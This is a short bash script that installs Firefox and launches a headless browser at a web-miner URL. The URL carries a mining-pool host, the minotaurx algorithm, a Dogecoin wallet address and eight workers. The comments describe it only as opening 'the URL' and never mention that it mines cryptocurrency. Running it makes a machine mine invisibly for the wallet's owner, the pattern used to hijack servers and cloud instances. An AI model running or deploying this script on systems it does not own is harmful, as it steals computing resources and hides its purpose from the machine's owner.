#!/bin/bash

# Update the system and install Firefox-ESR if not already installed
echo "Updating system and installing Firefox-ESR..."
sudo apt-get update -y
sudo apt-get install -y firefox

# Define the URL
URL="https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=DDTP57jh2uLFtWVzj3Thm7MggEw1Etawp3&password=c%3DDOGE&workers=8"

# Run Firefox in headless mode to open the URL
echo "Running Firefox in headless mode to access the URL..."
firefox --headless --new-tab "$URL"

# Confirm completion
echo "Firefox has launched the URL in headless mode."